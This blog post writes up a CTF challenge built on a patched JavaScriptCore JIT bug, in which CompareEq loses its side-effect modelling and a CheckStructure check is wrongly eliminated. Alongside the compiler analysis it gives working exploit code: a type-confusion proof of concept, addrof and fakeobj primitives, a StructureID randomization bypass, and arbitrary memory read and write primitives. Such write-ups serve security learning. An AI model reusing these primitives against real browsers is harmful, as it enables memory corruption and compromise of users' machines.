---
layout: post
title: FireShell ctf 2020 The Return of the Side Effect writeup
date: 2021-01-03 08:00:51
categories: browser-pwn
permalink: /archivers/jsc-pwn-FireShell-ctf-2020-The-Return-of-the-Side-Effect-writeup-en
---


It's a ctf challenge, the same bug as ZDI post [INVERTING YOUR ASSUMPTIONS: A GUIDE TO JIT COMPARISONS](https://www.thezdi.com/blog/2018/4/12/inverting-your-assumptions-a-guide-to-jit-comparisons ), but pathed in a new version of jsc. It's a `side effect` bug with `CompareEq` opcode. I used to try to learn about `CheckStructure Elimination` by debugging this bug, but was stucked for the reason that i couldn't find the corresponding commit. I take this opportunity to learn about `CheckStructure Elimination` by analyzing this vulnerability.

## Basic Knowledge

### CompareEq--side effect

The first thing need to know is that the `CompareEq` node has `side effect`,  `==` and `===` are different in `js`.  When the two side value types are different, `==` will Perform type conversion first, and then compare. `===` doesn't do type conversion, different types must be unequal. `jsc` generates `CompareEq` node in `dfg IR` for `==` and  `CompareStrictEq` node for `===` .

`==` will perform type conversion, it has  `side effect`. Specifically, its execution process is shown as below:

1. If one para is `null` and the other is `undefined`, then they are equal.
2. If one para is string and the other is a numeric value, convert the string to a numeric value and compare.
3. If any value is `true`, convert it to `1` and compare again; if any value is `false`, convert it to `0` and compare again.
4. If one para is an object and the other is a numeric value or string, convert the object into a value of the basic type and compare. The object is converted to the basic type by  its `toString` or `valueOf` method. 
5. Any other combination is not equal.

The `side effect` happens in `toString` or `valueOf` method call.

The corresponding function is `equalSlowCaseInline`. Break at this function in gdb, when executing `var a=[1.1, {}], a==1.1` in `jsc` console, we can see that the breakpoint is triggered successfully, and the stack trace is shown as follows:

```bash
pwndbg> bt
#0  JSC::JSValue::equalSlowCaseInline (globalObject=0x7fffaeafdb68, v1=..., v2=...) at ../../Source/JavaScriptCore/runtime/JSCJSValueInlines.h:1031
#1  0x00007ffff630593b in JSC::JSValue::equalSlowCase (globalObject=0x7fffaeafdb68, v1=..., v2=...) at ../../Source/JavaScriptCore/runtime/Operations.cpp:36
#2  0x00007ffff50876ba in JSC::JSValue::equal (globalObject=0x7fffaeafdb68, v1=..., v2=...) at ../../Source/JavaScriptCore/runtime/JSCJSValueInlines.h:1027
#3  0x00007ffff612cf5b in JSC::slow_path_eq (callFrame=0x7fffffffd130, pc=0x7fffef0bfcef) at ../../Source/JavaScriptCore/runtime/CommonSlowPaths.cpp:416
#4  0x00007ffff5f40e73 in llint_op_eq () at ../../Source/JavaScriptCore/heap/HandleTypes.h:36
```

Go into the `equl` function:

```c++
// runtime/JSCJSValueInlines.h: 1022
// ECMA 11.9.3
inline bool JSValue::equal(JSGlobalObject* globalObject, JSValue v1, JSValue v2)
{
    if (v1.isInt32() && v2.isInt32())
        return v1 == v2;

    return equalSlowCase(globalObject, v1, v2);
}
```

It can be seen that in `equalSlowCase` when there is an object on either side of `==`,  `toPrimitive` method will be called and the callback function will be triggered, so `==` has a `side effect`.

```js
// runtime/JSCJSValueInlines.h: 1030
ALWAYS_INLINE bool JSValue::equalSlowCaseInline(JSGlobalObject* globalObject, JSValue v1, JSValue v2)
{
    VM& vm = getVM(globalObject);
    auto scope = DECLARE_THROW_SCOPE(vm);
    do {
        ...

        if (v1.isObject()) {
            if (v2.isObject())
                return v1 == v2;
            JSValue p1 = v1.toPrimitive(globalObject); // can trigger callback
            RETURN_IF_EXCEPTION(scope, false);
            v1 = p1;
            if (v1.isInt32() && v2.isInt32())
                return v1 == v2;
            continue;
        }

        if (v2.isObject()) {
            JSValue p2 = v2.toPrimitive(globalObject);  // can trigger callback
            RETURN_IF_EXCEPTION(scope, false);
            v2 = p2;
            if (v1.isInt32() && v2.isInt32())
                return v1 == v2;
            continue;
        }

        ...
    } while (true);
}
```

### CheckStructure Redundancy Elimination

For reasons of space, here is not a detailed description of how the `CheckStructure Redundancy Elimination` is achieved. I just briefly review it here. If you want to learn more, you can read my post "The Past and Present of CheckStructure". 

`JSC` trys to analysis `DFG IR`  staticlly with `Abstract Interpreter` (abbreviated as `AI`), and optimize `DFG IR` with the results. The analysis result of `AI` is stored in `InPlaceAbstractState m_state`.  `m_state` is mainly composed of the  `AbstractValue` which is the abstract representation of the variable. `AbstractValue` is mainly used to indicate the `structure`, `type`, `array mode`, etc of a `value` that may exist when running to the current node.

`AI` abstractly execute `DFG IR` with the `executeEffects` function:

```c++
// dfg/DFGAbstractInterpreterInlines.h: 345
template<typename AbstractStateType>
bool AbstractInterpreter<AbstractStateType>::executeEffects(unsigned clobberLimit, Node* node)
{
    verifyEdges(node);
    
    m_state.createValueForNode(node);
    
    switch (node->op()) {
      	...
    // dfg/DFGAbstractInterpreterInlines.h: 389
    case GetLocal: {
        VariableAccessData* variableAccessData = node->variableAccessData();
        AbstractValue value = m_state.operand(variableAccessData->operand());
        // The value in the local should already be checked.
        DFG_ASSERT(m_graph, node, value.isType(typeFilterFor(variableAccessData->flushFormat())));
        if (value.value())
            m_state.setShouldTryConstantFolding(true);
        setForNode(node, value);
        break;
    }
    		...
    // dfg/DFGAbstractInterpreterInlines.h: 994
    case ValueMul: {
        if (node->binaryUseKind() == BigIntUse)
            setTypeForNode(node, SpecBigInt);
        else {
            clobberWorld();
            setTypeForNode(node, SpecBytecodeNumber | SpecBigInt);
        }
        break;
    }
    // dfg/DFGAbstractInterpreterInlines.h: 3229
    case CheckStructure: {
        AbstractValue& value = forNode(node->child1());

        const RegisteredStructureSet& set = node->structureSet();
        
        // It's interesting that we could have proven that the object has a larger structure set
        // that includes the set we're testing. In that case we could make the structure check
        // more efficient. We currently don't.
        
        if (value.m_structure.isSubsetOf(set))
            m_state.setShouldTryConstantFolding(true);

        SpeculatedType admittedTypes = SpecNone;
        switch (node->child1().useKind()) {
        case CellUse:
        case KnownCellUse:
            admittedTypes = SpecNone;
            break;
        case CellOrOtherUse:
            admittedTypes = SpecOther;
            break;
        default:
            DFG_CRASH(m_graph, node, "Bad use kind");
            break;
        }
        
        filter(value, set, admittedTypes);
        break;
    }
```

The functions that related with `AbstractValue` are:

* Function `setForNode` will create  node `value` (for example, the handle routine of `GetLocal` node  will call `setForNode`);
* Function  `forNode` function will get node `value` (most node handle routine will call `forNode`); 
* Function `filter` will modify node ` value` (for example,  `CheckStructure` handle routine will call `filter`); 
* `clobberWorld` function resets node `value` ( `ValueMul`  handle routine will call).

The `constant folding phase` calls the `foldConstants` function to achieve constant folding (including the redundancy elimination of  `CheckStructure` ).

```c++
		// dfg/DFGConstantFoldingPhase.cpp: 117
		bool foldConstants(BasicBlock* block)
    {
        bool changed = false;
        m_state.beginBasicBlock(block);
        for (unsigned indexInBlock = 0; indexInBlock < block->size(); ++indexInBlock) {
            if (!m_state.isValid())
                break;
            
            Node* node = block->at(indexInBlock);

            bool alreadyHandled = false;
            bool eliminated = false;
                    
            switch (node->op()) {
            ...
            // dfg/DFGConstantFoldingPhase.cpp: 174
            case CheckStructure:
            case ArrayifyToStructure: {
                AbstractValue& value = m_state.forNode(node->child1());
                RegisteredStructureSet set;
                if (node->op() == ArrayifyToStructure) {
                    set = node->structure();
                    ASSERT(!isCopyOnWrite(node->structure()->indexingMode()));
                }
                else {
                    set = node->structureSet();
                    if ((SpecCellCheck & SpecEmpty) && node->child1().useKind() == CellUse && m_state.forNode(node->child1()).m_type & SpecEmpty) {
                        m_insertionSet.insertNode(
                            indexInBlock, SpecNone, AssertNotEmpty, node->origin, Edge(node->child1().node(), UntypedUse));
                    }
                }
                if (value.m_structure.isSubsetOf(set)) {
                    m_interpreter.execute(indexInBlock); // Catch the fact that we may filter on cell.
                    node->remove(m_graph);
                    eliminated = true;
                    break;
                }
                break;
            }
```

As the pesudo code shown below, the first `CheckStructure` in `executeEffect` will add the corresponding `structure` to the `AbstractValue` of the `s1`. Since the code between the two `CheckStructure` nodes have no `side effect`, when running to the second `CheckStructure`, the `Structure` of the `s1` is still valid in `AbstractValue`. So during the execution of `foldConstants` function, the condition of `value.m_structure.isSubsetOf` is satisfied, the second `CheckStructure` node will be eliminated(`node->remove(m_graph)`).

```asm
CheckStructure s1
...  ; no side effect code
CheckStructure s1
```

If there are  `side effects` in the code between two `CheckStructure` nodes, such as the code shown as below. The handle routine of  `side effect` node will call `clobberWorld` to reset all `AbstractValue` (`m_effectEpoch` in `m_state` changes) in `m_state` . Then when processing the second `CheckStructure` node, the condition of `value.m_structure.isSubsetOf(set)` will not satisfied, the second `CheckStructure` will not be eliminated.

```asm
CheckStructure s1
...  ; side effect code
CheckStructure s1
```

## Description

According to the `readme` given by the challenge, first compile the corresponding version of `jsc`:

```bash
git checkout 830f2e892431f6fea022f09f70f2f187950267b7
cd Source/JavaScriptCore/dfg
cp DFGAbstractInterpreterInlines.h DFGAbstractInterpreterInlines__patch.h
git apply < ./patch.diff
cp DFGAbstractInterpreterInlines__patch.h DFGAbstractInterpreterInlines.h
cd ../../../
```

## Analysis

Look at `patch` code shown as below:

```diff
--- DFGAbstractInterpreterInlines.h	2020-03-19 13:12:31.165313000 -0700
+++ DFGAbstractInterpreterInlines__patch.h	2020-03-16 10:34:40.464185700 -0700
@@ -1779,10 +1779,10 @@
     case CompareGreater:
     case CompareGreaterEq:
     case CompareEq: {
-        bool isClobbering = node->isBinaryUseKind(UntypedUse);
+    //    bool isClobbering = node->isBinaryUseKind(UntypedUse);
         
-        if (isClobbering)
-            didFoldClobberWorld();
+   //     if (isClobbering)
+   //         didFoldClobberWorld();
         
         JSValue leftConst = forNode(node->child1()).value();
         JSValue rightConst = forNode(node->child2()).value();
@@ -1905,8 +1905,8 @@
             }
         }
 
-        if (isClobbering)
-            clobberWorld();
+    //    if (isClobbering)
+    //        clobberWorld();
         setNonCellTypeForNode(node, SpecBoolean);
         break;
     }
```

It has commented out the `clobberWorld` and `didFoldClobberWorld` functions in the processing code of `CompareEq` in `AI`. These two functions are the codes that indicate the node has side effects, so the patch means `side effect` of  `CompareEq node` is dropped.

### build poc

The persudo poc of classic `side effect` bug  is:

```asm
CheckStructure s1
GetByVal s1
side effect code  ;; AI thought it has no side-effect, but it actually has
CheckStructure s1
GetByVal s1
```

After the `constant folding` phase, the second `CheckStructure` node will be eliminated. Thus the subsequent operations(`GetByVal`) on `s1` will still follow the type of the first `structure` , but the structure of `s1`  has changed when the `side effect code` is executed,  which forms a type confusion vulnerability here.

```asm
CheckStructure s1
GetByVal s1
side effect code  ;; AI thought it has no side-effect, but it actually has
GetByVal s1
```

According to the above idea, the constructed `poc` is as follows:

```c++
const MAX_ITERATIONS = 0xc0000;

var val = 2.2;
function foo(arr, obj)
{
    arr[1] = 1.1;
    obj == val;
    return arr[0];
}

let template = [1.1, 2.2, 3.3];
template.x = {};

let arr = [1.1, 2.2, 3.3];
for( let i=0; i<MAX_ITERATIONS; i++ ) {
    foo(arr, template);
}

let evil = {
    toString: () => {
        arr[0] = template;
    }
}

print(foo(arr, evil));
```

The running result in `release` mode of `jsc` is shown as below, which is worked:

```bash
$ ../webkit/WebKitBuild/Release/bin/jsc poc.js
6.9012406961453e-310
```

It need to point out an error will be reported when running with `jsc` in `debug` mode:

```bash
$ ../webkit/WebKitBuild/Debug/bin/jsc poc.js
DFG ASSERTION FAILED: AI-clobberize disagreement; AI says NotClobbered while clobberize says (Direct:[Heap], Super:[World])
../../Source/JavaScriptCore/dfg/DFGCFAPhase.cpp(240) : void JSC::DFG::CFAPhase::performBlockCFA(JSC::DFG::BasicBlock*)
```

The reason is that it didn't patch the `side effect` in `clobberize` function. It make the `execute` function of `AI` think that `CompareEq` has no `side effect`, while the `clobberize` function thinks (called by the `writesOverlap` function) that `CompareEq` has a side effect, resulting in ambiguity between the two function, so it goes crash in the `performBlockCFA` function.

It will only report error in the `debug` version, because `ASSERT_ENABLED` is defined under the `debug` version, and the `release` version does not have this trouble.

```c++
		// dfg/DFGCFAPhase.cpp: 202
		void performBlockCFA(BasicBlock* block)
    {
						...
						// dfg/DFGCFAPhase.cpp: 232
						if (!m_interpreter.execute(i)) {
                if (m_verbose)
                    dataLogF("         Expect OSR exit.\n");
                break;
            }
            
            if (ASSERT_ENABLED
                && m_state.didClobberOrFolded() != writesOverlap(m_graph, node, JSCell_structureID))
                DFG_CRASH(m_graph, node, toCString("AI-clobberize disagreement; AI says ", m_state.clobberState(), " while clobberize says ", writeSet(m_graph, node)).data());
        }
```

If still want to debug on the `debug` version, there are two ways. The first is to comment out the `if (ASSERT_ENABLED` code, which is violent.

```c++
						if (ASSERT_ENABLED
                && m_state.didClobberOrFolded() != writesOverlap(m_graph, node, JSCell_structureID))
                DFG_CRASH(m_graph, node, toCString("AI-clobberize disagreement; AI says ", m_state.clobberState(), " while clobberize says ", writeSet(m_graph, node)).data());
```

The second is solving the problem from the root cause. Just patch the the `side effect` of the `CompareEq` node in `clobberize` function, as shown below:

```c++
// dfg/DFGClobberize.h: 42
template<typename ReadFunctor, typename WriteFunctor, typename DefFunctor>
void clobberize(Graph& graph, Node* node, const ReadFunctor& read, const WriteFunctor& write, const DefFunctor& def)
{
  	...
    case CompareEq:
    case CompareLess:
    case CompareLessEq:
    case CompareGreater:
    case CompareGreaterEq:
        if (node->isBinaryUseKind(StringUse)) {
            read(HeapObjectCount);
            write(HeapObjectCount);
            return;
        }
				
        if (node->isBinaryUseKind(UntypedUse)) {
            // read(World);
            // write(Heap);
            return;
        }
        def(PureValue(node));
        return;
  		...
```

### poc analysis

We can get further understanding of `CheckStructure Elimination` through dynamic debugging or print `dfg IR` graph. Here I'll explain more with `dfg IR` graph.

the command to dump graph at each phase is:

```
../webkit/WebKitBuild/Release/bin/jsc --dumpGraphAtEachPhase=true  --useConcurrentJIT=false ./poc.js
```

After the `fixup phase`, the `dfg IR` related to the `CheckStructure` node is shown as below (node `47` and `49`):

```asm
        7: Phase fixup changed the IR.

        8: Beginning DFG phase invalidation point injection.
        8: Before invalidation point injection:

        8: DFG for foo#DJg3G9:[0x7fcda1cc8240->0x7fcda1cc8120->0x7fcda1ce5200, DFGFunctionCall, 38]:
        8:   Fixpoint state: BeforeFixpoint; Form: ThreadedCPS; Unification state: GloballyUnified; Ref count state: EverythingIsLive
        8:   Arguments for block#0: D@0, D@1, D@2

     ...
  0  0  8:    D@0:< 1:->	SetArgumentDefinitely(IsFlushed, this(a), W:SideState, bc#0, ExitValid)  predicting OtherObj
  1  0  8:    D@1:< 1:->	SetArgumentDefinitely(IsFlushed, arg1(B<Array>/FlushedCell), W:SideState, bc#0, ExitValid)  predicting Array
  2  0  8:    D@2:< 1:->	SetArgumentDefinitely(IsFlushed, arg2(C~<Array>/FlushedJSValue), W:SideState, bc#0, ExitValid)  predicting Array
  ...
 23  0  8:   D@23:<!0:->	GetLocal(Check:Untyped:D@1, JS|MustGen|UseAsOther, Array, arg1(B<Array>/FlushedCell), R:Stack(arg1), bc#7, ExitValid)  predicting Array
 ...
 26  0  8:   D@47:<!0:->	CheckStructure(Check:Cell:D@23, MustGen, [%Dz:Array], R:JSCell_structureID, Exits, bc#7, ExitValid)
 27  0  8:   D@48:< 1:->	GetButterfly(Check:Cell:D@23, Storage|PureInt, R:JSObject_butterfly, Exits, bc#7, ExitValid)
 28  0  8:   D@26:<!0:->	PutByVal(Check:KnownCell:D@23, Check:Int32:D@24, Check:DoubleRepReal:D@25<Double>, Check:Untyped:D@48, MustGen|VarArgs, Double+OriginalArray+InBounds+AsIs+Write, R:Butterfly_publicLength,Butterfly_vectorLength,IndexedDoubleProperties, W:IndexedDoubleProperties, Exits, ClobbersExit, bc#7, ExitValid)
 ...
 38  0  8:   D@36:<!0:->	CompareEq(Check:Untyped:D@35, Check:Untyped:D@32, Boolean|MustGen|PureInt, Bool, R:World, W:Heap, Exits, ClobbersExit, bc#27, ExitValid)
 ...
 42  0  8:   D@49:<!0:->	CheckStructure(Check:Cell:D@23, MustGen, [%Dz:Array], R:JSCell_structureID, Exits, bc#31, ExitValid)
 43  0  8:   D@50:< 1:->	GetButterfly(Check:Cell:D@23, Storage|PureInt, R:JSObject_butterfly, Exits, bc#31, ExitValid)
 44  0  8:   D@40:<!0:->	GetByVal(Check:KnownCell:D@23, Check:Int32:D@39, Check:Untyped:D@50, Double|MustGen|VarArgs|UseAsOther, AnyIntAsDouble|NonIntAsDouble, Double+OriginalArray+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedDoubleProperties, Exits, bc#31, ExitValid)  predicting NonIntAsDouble
 ...
```

After `structure check hoist phase`, `CheckStructure` is promoted to the front of the function (node `55`):

```asm
        9: Phase structure check hoisting changed the IR.

       10: Beginning DFG phase strength reduction.
       10: Before strength reduction:

       10: DFG for foo#DJg3G9:[0x7fcda1cc8240->0x7fcda1cc8120->0x7fcda1ce5200, DFGFunctionCall, 38]:
       10:   Fixpoint state: FixpointNotConverged; Form: ThreadedCPS; Unification state: GloballyUnified; Ref count state: EverythingIsLive
       10:   Arguments for block#0: D@0, D@1, D@2

     ...
  0  0 10:    D@0:< 1:->	SetArgumentDefinitely(IsFlushed, this(a), W:SideState, bc#0, ExitValid)  predicting OtherObj
  1  0 10:    D@1:< 1:->	SetArgumentDefinitely(IsFlushed, arg1(B<Array>/FlushedCell), W:SideState, bc#0, ExitValid)  predicting Array
  2  0 10:   D@54:<!0:->	GetLocal(Check:Untyped:D@1, JS|MustGen|PureInt, Array, arg1(B<Array>/FlushedCell), R:Stack(arg1), bc#0, ExitValid)  predicting Array
  3  0 10:   D@55:<!0:->	CheckStructure(Check:Cell:D@54, MustGen, [%Dz:Array], R:JSCell_structureID, Exits, bc#0, ExitValid)
  4  0 10:    D@2:< 1:->	SetArgumentDefinitely(IsFlushed, arg2(C~<Array>/FlushedJSValue), W:SideState, bc#0, ExitValid)  predicting Array
  ...
 28  0 10:   D@47:<!0:->	CheckStructure(Check:Cell:D@54, MustGen, [%Dz:Array], R:JSCell_structureID, Exits, bc#7, ExitValid)
 29  0 10:   D@48:< 1:->	GetButterfly(Check:Cell:D@54, Storage|PureInt, R:JSObject_butterfly, Exits, bc#7, ExitValid)
 30  0 10:   D@26:<!0:->	PutByVal(Check:KnownCell:D@54, Check:Int32:D@24, Check:DoubleRepReal:D@25<Double>, Check:Untyped:D@48, MustGen|VarArgs, Double+OriginalArray+InBounds+AsIs+Write, R:Butterfly_publicLength,Butterfly_vectorLength,IndexedDoubleProperties, W:IndexedDoubleProperties, Exits, ClobbersExit, bc#7, ExitValid)
 ...
 36  0 10:   D@32:< 1:->	JSConstant(JS|PureNum|UseAsOther, NonIntAsDouble, Double: 4612136378390124954, 2.200000, bc#19, ExitValid)
 ...
 39  0 10:   D@35:<!0:->	GetLocal(Check:Untyped:D@2, JS|MustGen|PureNum|UseAsOther, Array, arg2(C~<Array>/FlushedJSValue), R:Stack(arg2), bc#27, ExitValid)  predicting Array
 40  0 10:   D@36:<!0:->	CompareEq(Check:Untyped:D@35, Check:Untyped:D@32, Boolean|MustGen|PureInt, Bool, R:World, W:Heap, Exits, ClobbersExit, bc#27, ExitValid)
 ...
 45  0 10:   D@49:<!0:->	CheckStructure(Check:Cell:D@54, MustGen, [%Dz:Array], R:JSCell_structureID, Exits, bc#31, ExitValid)
 46  0 10:   D@50:< 1:->	GetButterfly(Check:Cell:D@54, Storage|PureInt, R:JSObject_butterfly, Exits, bc#31, ExitValid)
 47  0 10:   D@40:<!0:->	GetByVal(Check:KnownCell:D@54, Check:Int32:D@39, Check:Untyped:D@50, Double|MustGen|VarArgs|UseAsOther, AnyIntAsDouble|NonIntAsDouble, Double+OriginalArray+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedDoubleProperties, Exits, bc#31, ExitValid)  predicting NonIntAsDouble
 ...
```

After the `constant folding phase`, we can see that the `CheckStructure` node `47` and `49` node have been deleted:

```asm
       13: Phase constant folding changed the IR.

       14: Beginning DFG phase CFG simplification.
       14: Before CFG simplification:

       14: DFG for foo#DJg3G9:[0x7fcda1cc8240->0x7fcda1cc8120->0x7fcda1ce5200, DFGFunctionCall, 38]:
       14:   Fixpoint state: FixpointNotConverged; Form: ThreadedCPS; Unification state: GloballyUnified; Ref count state: EverythingIsLive
       14:   Arguments for block#0: D@0, D@1, D@2

     ...
  0  0 14:    D@0:< 1:->	SetArgumentDefinitely(IsFlushed, this(a), W:SideState, bc#0, ExitValid)  predicting OtherObj
  1  0 14:    D@1:< 1:->	SetArgumentDefinitely(IsFlushed, arg1(B<Array>/FlushedCell), W:SideState, bc#0, ExitValid)  predicting Array
  2  0 14:   D@54:<!0:->	GetLocal(Check:Untyped:D@1, JS|MustGen|PureInt, Array, arg1(B<Array>/FlushedCell), R:Stack(arg1), bc#0, ExitValid)  predicting Array
  3  0 14:   D@56:<!0:->	AssertNotEmpty(Check:Untyped:D@54, MustGen, W:SideState, Exits, bc#0, ExitValid)
  4  0 14:   D@55:<!0:->	CheckStructure(Cell:D@54, MustGen, [%Dz:Array], R:JSCell_structureID, Exits, bc#0, ExitValid)
  ...
 30  0 14:   D@48:< 1:->	GetButterfly(Cell:D@54, Storage|PureInt, R:JSObject_butterfly, Exits, bc#7, ExitValid)
 31  0 14:   D@26:<!0:->	PutByVal(KnownCell:D@54, Int32:D@24, DoubleRepReal:D@25<Double>, Check:Untyped:D@48, MustGen|VarArgs, Double+OriginalArray+InBounds+AsIs+Write, R:Butterfly_publicLength,Butterfly_vectorLength,IndexedDoubleProperties, W:IndexedDoubleProperties, Exits, ClobbersExit, bc#7, ExitValid)
 ...
 37  0 14:   D@32:< 1:->	JSConstant(JS|PureNum|UseAsOther, NonIntAsDouble, Double: 4612136378390124954, 2.200000, bc#19, ExitValid)
 ...
 40  0 14:   D@35:<!0:->	GetLocal(Check:Untyped:D@2, JS|MustGen|PureNum|UseAsOther, Array, arg2(C~<Array>/FlushedJSValue), R:Stack(arg2), bc#27, ExitValid)  predicting Array
 41  0 14:   D@36:<!0:->	CompareEq(Check:Untyped:D@35, Check:Untyped:D@32, Boolean|MustGen|PureInt, Bool, R:World, W:Heap, Exits, ClobbersExit, bc#27, ExitValid)
 ...
 46  0 14:   D@49:<!0:->	Check(MustGen, bc#31, ExitValid)
 47  0 14:   D@50:< 1:->	GetButterfly(Cell:D@54, Storage|PureInt, R:JSObject_butterfly, Exits, bc#31, ExitValid)
 48  0 14:   D@40:<!0:->	GetByVal(KnownCell:D@54, Int32:D@39, Check:Untyped:D@50, Double|MustGen|VarArgs|UseAsOther, AnyIntAsDouble|NonIntAsDouble, Double+OriginalArray+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedDoubleProperties, Exits, bc#31, ExitValid)  predicting NonIntAsDouble
 ...
```

However, the `CompareEq` node (node `36` ) has `side effect` (which may cause the object's `structure` changing), resulting in a type confusion bug when the  node `40` `GetByVal` getting the object properties.

## Exploit

With the type confusion vulnerability and the accumulated experience of previous exploits, the process of exploiting this vulnerability becomes easier.

The first thing is to construct `AddrOf` and `FakeObj` primitives with bug:

```js
let noCoW = 13.37;

let arr = [noCoW, 2.2, 3.3];

function AddrOfFoo(arr, cmpObj)
{
    arr[1] = 1.1;
    cmpObj == 2.2;  // trigger callback
    return arr[0];
}

// optimize compile AddrOfFoo
for( let i=0; i<MAX_ITERATIONS; i++ ) {
    AddrOfFoo(arr, {});
}

// addr_of primitive with vuln
function AddrOf(obj) {

    let arr = new Array(noCoW, 2,2, 3.3);
 
    let evil = {
        // vuln callback
        toString: () => {
            arr[0] = obj;
        }
    }

    let addr = AddrOfFoo(arr, evil);
    return f2i(addr);
}

function FakeObjFoo(arr, cmpObj, addr)
{
    arr[1] = 1.1;
    cmpObj == 2.2;  // trigger callback
    arr[0] = addr;
}

// optimize compiler FakeObjFoo
for( let i=0; i<MAX_ITERATIONS; i++ ) {
    FakeObjFoo(arr, {}, 1.1);
}

// fake_obj primitive with vuln
function FakeObj(addr) {

    addr = i2f(addr);
    let arr = new Array(noCoW, 2.2, 3.3);

    let evil = {
        // vuln callback
        toString: () => {
            arr[0] = {};
        }
    }

    FakeObjFoo(arr, evil, addr);
    return arr[0];
}
```

It should be pointed out that there are two small tricks in the upper code. 

One is that the `for` loop is not included into the `AddrOf` and `FakeObj` primitive functions . According to the method show as below (include the `for` loop into the primitives), it can achieve the `addr of` and `fake obj` fucntions too. But if we do like that, every time the primitive is called, the `for` loop will be executed once, which will cause the garbage collection to be triggered frequently. This leads to error in obtaining `structure id` with building the fake object later. So I figured out the way to put the `for` loop outside the primitives, and it will only call the `for` loop once at the initial time.

```js
 // addr_of primitive with vuln
function AddrOf(obj) {

    let arr = [1.1, 2.2, 3.3];

    function AddrOfFoo(arr, cmpObj)
    {
        arr[1] = 1.1;
        cmpObj == 2.2;  // trigger callback
        return arr[0];
    }

    // optimize compile AddrOfFoo
    for( let i=0; i<MAX_ITERATIONS; i++ ) {
        AddrOfFoo(arr, {});
    }

    let evil = {
        // vuln callback
        toString: () => {
            arr[0] = obj;
        }
    }

    let addr = AddrOfFoo(arr, evil);
    return f2i(addr);
}
```

Another `trick` is in the primitive, we declare  `arr` array with `let arr = new Array(noCoW, 2.2, 3.3)` instead of `arr = [noCoW, 2.2, 3.3]`. The reason is that the structure of  `arr = [noCoW, 2.2, 3.3]` will no longer be `double array` but `object array` after the vulnerability is triggered once. The form of `new Array` can ensure every time the declaration of `arr` is `double array`.

The next step is to leak valid `structure id` to bypass  `structure id randomization` mechanism with the two primitives. Just referring the [Thinking outside the JIT Compiler: Understanding and bypassing StructureID Randomization with generic and old-school methods](https:// i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods. pdf) technique.

```js
// leak entropy by functionProtoFuncToString
function LeakStructureID(obj)
{
    // https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf

    var unlinkedFunctionExecutable = {
        m_isBuitinFunction: i2f(0xdeadbeef),
        pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
        m_identifier: {},
    };

    var fakeFunctionExecutable = {
      pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
      m_executable: unlinkedFunctionExecutable,
    };

    var container = {
      jscell: i2f(0x00001a0000000000),
      butterfly: {},
      pad: 0,
      m_functionExecutable: fakeFunctionExecutable,
    };


    let fakeObjAddr = AddrOf(container) + 0x10;
    let fakeObj = FakeObj(fakeObjAddr);

    unlinkedFunctionExecutable.m_identifier = fakeObj;
    container.butterfly = arrLeak;

    var nameStr = Function.prototype.toString.call(fakeObj);

    let structureID = nameStr.charCodeAt(9);

    // repair the fakeObj's jscell
    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;
    container.jscell = f64[0];
    return structureID;
}

// leak entropy by getByVal
function LeakStructureID2(obj)
{
    let container = {
        cellHeader: i2obj(0x0108230700000000),
        butterfly: obj
    };

    let fakeObjAddr = AddrOf(container) + 0x10;
    let fakeObj = FakeObj(fakeObjAddr);
    f64[0] = fakeObj[0];

    // print(123); 
    let structureID = u32[0];
    u32[1] = 0x01082307 - 0x20000;
    container.cellHeader = f64[0];

    return structureID;
}

let pad = new Array(noCoW, 2.2, {}, 13.37);
let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
// print(describe(pad));
// print(describe(arrLeak)); 
// let structureID = LeakStructureID2(arrLeak);
let structureID = LeakStructureID(arrLeak);
print("[+] leak structureID: "+hex(structureID));
```

There is also a small `trick` here, which I added some `pad` arrays in front of  `arrLeak`. The function of these `pads` is to fill the memory, so that when `arrLeak` is used as the `butterfly` of `fake obj`, the memory before the `butterfly`  (`arrLeak`) has a value instead of `0`. It will ensure that trigger no error when accessing element during leaking the `strcucture id`. For details about bypass `StructureID Randomization`, please see my post "StructureID Randomization Source Code Analysis and Bypass".

Of course, we can also call the `describe` function to obtain a valid `structure id` like the way existing `writeup` does, but it's feel not so cool.

The next thing is to construct the `NewAddrOf` and `NewFakeObj` primitives by constructing the `boxed` array and `unboxed` array  with shared `butterfly`, and then construct `aar` and `aaw` primitives  with the `prop` property access.

```js
pad = [{}, {}, {}];
var victim = [noCoW, 14.47, 15.57];
victim['prop'] = 13.37;
victim['prop_0'] = 13.37;

u32[0] = structureID;
u32[1] = 0x01082309-0x20000;
// container to store fake driver object
var container = {
    cellHeader: f64[0],
    butterfly: victim   
};
// build fake driver
var containerAddr = AddrOf(container);
var fakeArrAddr = containerAddr + 0x10;
print("[+] fake driver object addr: "+hex(fakeArrAddr));
var driver = FakeObj(fakeArrAddr);

// ArrayWithDouble
var unboxed = [noCoW, 13.37, 13.37];
// ArrayWithContiguous
var boxed = [{}];

// leak unboxed butterfly's addr
driver[1] = unboxed;
var sharedButterfly = victim[1];
print("[+] shared butterfly addr: " + hex(f2i(sharedButterfly)));
// now the boxed array and unboxed array share the same butterfly
driver[1] = boxed;
victim[1] = sharedButterfly;
// print(describe(boxed));
// print(describe(unboxed));


// set driver's cell header to double array
u32[0] = structureID;
u32[1] = 0x01082307-0x20000;
container.cellHeader = f64[0];

function NewAddrOf(obj) {
    boxed[0] = obj;
    return f2i(unboxed[0]);
}

function NewFakeObj(addr) {
    unboxed[0] = i2f(addr);
    return boxed[0];            
}

function Read64(addr) {
    driver[1] = i2f(addr+0x10);
    return NewAddrOf(victim.prop);
    // return f2i(victim.prop);
}

function Write64(addr, val) {
    driver[1] = i2f(addr+0x10);
    // victim.prop = this.fake_obj(val);
    victim.prop = i2f(val);
}
```

